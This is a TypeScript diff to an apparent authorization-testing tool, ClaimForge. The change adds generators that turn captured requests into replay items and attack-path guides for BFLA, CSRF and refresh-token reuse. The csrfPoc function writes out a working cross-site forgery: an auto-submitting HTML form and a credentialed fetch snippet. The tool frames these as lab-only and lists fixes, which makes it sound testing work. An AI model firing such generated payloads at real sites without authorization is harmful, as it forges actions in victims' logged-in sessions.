@@ -1,6 +1,8 @@
-import type { AttackPath, CapturedRequest, Finding, JwtToken, ReplayItem, Workspace } from "./types.ts";
+import type { ActorId, AttackPath, CapturedRequest, Finding, JwtToken, ReplayItem, Workspace } from "./types.ts";
 import { mintJwt } from "./jwt.ts";
 import { pathIds } from "./ids.ts";
+import { headerValue } from "./cookies.ts";
+import { isRefreshRequest } from "./refresh.ts";
 import {
   applyCredentialBoundary,
   credentialSetFromBearer,
@@ -67,7 +69,155 @@ function toReplay(
   };
 }
 
-export function buildReplays(ws: Pick<Workspace, "requests" | "jwts" | "graph" | "aLabel" | "bLabel">): ReplayItem[] {
+function urlDecode(s: string): string {
+  try {
+    return decodeURIComponent(s.replace(/\+/g, " "));
+  } catch {
+    return s;
+  }
+}
+
+function htmlAttr(s: string): string {
+  return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
+/** Cross-site CSRF proof-of-concept for a captured state-changing request. */
+export function csrfPoc(sample: CapturedRequest): { html: string; fetch: string; isForm: boolean } {
+  const method = sample.method.toUpperCase();
+  const ct = headerValue(sample.requestHeaders, "content-type") ?? "";
+  const body = sample.requestBody ?? "";
+  const isForm =
+    method === "GET" || /application\/x-www-form-urlencoded/i.test(ct) || (!/json/i.test(ct) && /^[^={]*=[^&]*/.test(body));
+  let inputs = "";
+  if (body && isForm) {
+    for (const pair of body.split("&")) {
+      const eq = pair.indexOf("=");
+      const k = eq >= 0 ? pair.slice(0, eq) : pair;
+      const v = eq >= 0 ? pair.slice(eq + 1) : "";
+      if (!k) continue;
+      inputs += `\n    <input type="hidden" name="${htmlAttr(urlDecode(k))}" value="${htmlAttr(urlDecode(v))}">`;
+    }
+  }
+  const html = `<!-- open while logged in on another origin -->
+<form action="${htmlAttr(sample.url)}" method="${method === "GET" ? "GET" : "POST"}"${
+    isForm && method !== "GET" ? ' enctype="application/x-www-form-urlencoded"' : ""
+  }>${inputs}
+</form>
+<script>document.forms[0].submit()</script>`;
+  const fetchBody = body ? `,\n  body: ${JSON.stringify(body)}` : "";
+  const fetchSnippet = `// cross-site, victim's cookies ride along
+fetch(${JSON.stringify(sample.url)}, {
+  method: ${JSON.stringify(method)},
+  credentials: "include"${fetchBody}
+})`;
+  return { html, fetch: fetchSnippet, isForm };
+}
+
+function plainReplay(
+  id: string,
+  title: string,
+  severity: ReplayItem["severity"],
+  note: string,
+  curl: string,
+  raw: string,
+): ReplayItem {
+  return { id, title, severity, note, curl, raw };
+}
+
+function parseFp(fp: string | undefined): string[] {
+  return (fp ?? "").split(":");
+}
+
+/** BFLA: replay the low-privilege actor's exact request to the admin function. */
+function bflaReplays(findings: Finding[], requests: CapturedRequest[]): ReplayItem[] {
+  const out: ReplayItem[] = [];
+  for (const f of findings) {
+    if (!(f.fingerprint ?? "").startsWith("bfla:")) continue;
+    const [, actor, method, ...rest] = parseFp(f.fingerprint);
+    const template = rest.join(":");
+    const sample = requests.find(
+      (r) => r.actor === actor && r.method === method && r.template === template && r.status >= 200 && r.status < 300,
+    );
+    if (!sample) continue;
+    const creds = extractActorCredentials(requests.filter((r) => r.actor === (actor as ActorId)));
+    if (!creds) continue;
+    out.push(
+      toReplay(
+        `replay-bfla-${out.length}`,
+        `BFLA · actor ${actor} on ${method} ${template}`,
+        f.severity === "critical" ? "high" : f.severity,
+        "Only this actor's own credentials attached. If the admin function still succeeds in a lab proxy, function-level authz is missing. ClaimForge does not send it.",
+        sample,
+        creds,
+      ),
+    );
+  }
+  return out;
+}
+
+/** CSRF: emit a cross-site proof-of-concept (HTML auto-submit + fetch). */
+function csrfReplays(findings: Finding[], requests: CapturedRequest[]): ReplayItem[] {
+  const out: ReplayItem[] = [];
+  const seen = new Set<string>();
+  for (const f of findings) {
+    if (!(f.fingerprint ?? "").startsWith("csrf:")) continue;
+    const [, method, ...rest] = parseFp(f.fingerprint);
+    const template = rest.join(":");
+    const key = `${method} ${template}`;
+    if (seen.has(key)) continue;
+    const sample = requests.find(
+      (r) => r.method.toUpperCase() === method && r.template === template && headerValue(r.requestHeaders, "cookie"),
+    );
+    if (!sample) continue;
+    seen.add(key);
+    const poc = csrfPoc(sample);
+    out.push(
+      plainReplay(
+        `replay-csrf-${out.length}`,
+        `CSRF PoC · ${method} ${template}`,
+        f.severity === "critical" ? "high" : f.severity,
+        `Cross-site PoC — host on another origin and open it while logged in. If the state change lands, CSRF is real. ${
+          poc.isForm ? "Auto-submitting HTML form." : "JSON body needs a simple-request/CORS bypass; use the fetch snippet."
+        } Lab only — ClaimForge does not fire it.`,
+        poc.fetch,
+        poc.isForm ? poc.html : poc.fetch,
+      ),
+    );
+  }
+  return out;
+}
+
+/** Refresh reuse: replay the refresh call that presented the rotated token. */
+function refreshReplays(findings: Finding[], requests: CapturedRequest[]): ReplayItem[] {
+  const out: ReplayItem[] = [];
+  const seen = new Set<string>();
+  for (const f of findings) {
+    if (!(f.fingerprint ?? "").startsWith("refresh:")) continue;
+    const [, actor] = parseFp(f.fingerprint);
+    const sample = requests.find(
+      (r) => r.actor === actor && r.template === f.template && isRefreshRequest(r) && r.status >= 200 && r.status < 300,
+    );
+    if (!sample) continue;
+    const key = `${actor}:${sample.template}`;
+    if (seen.has(key)) continue;
+    seen.add(key);
+    out.push(
+      plainReplay(
+        `replay-refresh-${out.length}`,
+        `Refresh replay · actor ${actor} on ${sample.method} ${sample.template}`,
+        f.severity === "critical" ? "high" : f.severity,
+        "Replay this refresh call with the rotated (old) token well past any grace window. If it still returns 2xx, rotation is not enforced. Lab only.",
+        curlReplay(sample),
+        rawHttpFromSample(sample),
+      ),
+    );
+  }
+  return out;
+}
+
+export function buildReplays(
+  ws: Pick<Workspace, "requests" | "jwts" | "graph" | "aLabel" | "bLabel" | "findings">,
+): ReplayItem[] {
   const out: ReplayItem[] = [];
   const aReqs = ws.requests.filter((r) => r.actor === "A" && r.method !== "PASTE");
   const bReqs = ws.requests.filter((r) => r.actor === "B" && r.method !== "PASTE");
@@ -116,6 +266,10 @@ export function buildReplays(ws: Pick<Workspace, "requests" | "jwts" | "graph" |
 
   const swap = interestingSwap(aReqs, bReqs, bCreds, ws.bLabel);
   if (swap) out.push(swap);
+
+  out.push(...bflaReplays(ws.findings, ws.requests));
+  out.push(...csrfReplays(ws.findings, ws.requests));
+  out.push(...refreshReplays(ws.findings, ws.requests));
 
   return dedupeReplays(out);
 }
@@ -233,6 +387,58 @@ export function buildPaths(ws: {
         "Capture login, a privileged GET, logout, then the same GET.",
         "If the last GET is 2xx after a 2xx logout, the session may not be on a denylist.",
         "Replay that curl from Playbook on the lab. Do not fire it from this app.",
+      ],
+    });
+  }
+
+  const bflaF = ws.findings.filter((f) => (f.fingerprint ?? "").startsWith("bfla:"));
+  if (bflaF.length) {
+    paths.push({
+      id: "path-bfla",
+      title: `Function-level bypass · ${ws.bLabel}-tier actor hits admin functions`,
+      objective:
+        "Confirm a non-privileged role reaching an administrative function (BFLA). Capture heuristics are not a ship-it report — reproduce in a lab.",
+      findingIds: bflaF.map((f) => f.id),
+      steps: [
+        `Log in as the low-privilege role and capture the admin-function call(s).`,
+        "Copy the BFLA curl from the Replay pack (only that actor's credentials attached).",
+        "Replay in your interceptor on the lab. A privileged action that succeeds is the bug.",
+        "For verb-tampering rows, retry the same path with the alternate method (e.g. POST→PUT).",
+        "Fix: enforce role/permission on the function server-side, not just object ownership.",
+      ],
+    });
+  }
+
+  const csrfF = ws.findings.filter((f) => (f.fingerprint ?? "").startsWith("csrf:"));
+  if (csrfF.length) {
+    paths.push({
+      id: "path-csrf",
+      title: "CSRF · forge a cross-site state change",
+      objective:
+        "Cookie auth with no anti-CSRF token is only a candidate — prove it by forging the request from another origin while logged in.",
+      findingIds: csrfF.map((f) => f.id),
+      steps: [
+        "Copy the CSRF PoC from the Replay pack (auto-submit HTML form, or the fetch snippet for JSON bodies).",
+        "Host it on a different origin and open it in a browser session that is logged into the lab app.",
+        "If the state change lands without a token, CSRF is real. JSON bodies also need a simple-request/CORS bypass.",
+        "Fix: per-session anti-CSRF token, or SameSite=Lax/Strict plus a validated custom header.",
+      ],
+    });
+  }
+
+  const refreshF = ws.findings.filter((f) => (f.fingerprint ?? "").startsWith("refresh:"));
+  if (refreshF.length) {
+    paths.push({
+      id: "path-refresh",
+      title: "Refresh-token rotation abuse",
+      objective:
+        "A rotated refresh token accepted again may mean rotation is not enforced — but a short reuse/leeway window is legitimate (RFC 9700).",
+      findingIds: refreshF.map((f) => f.id),
+      steps: [
+        "Capture a full refresh: present token T, receive a new token T'.",
+        "Copy the Refresh replay from the Replay pack.",
+        "Replay T well past any grace window (seconds to minutes later, or after a second rotation).",
+        "If T still returns 2xx, rotation is broken. On true reuse, the server should revoke the whole token family.",
       ],
     });
   }
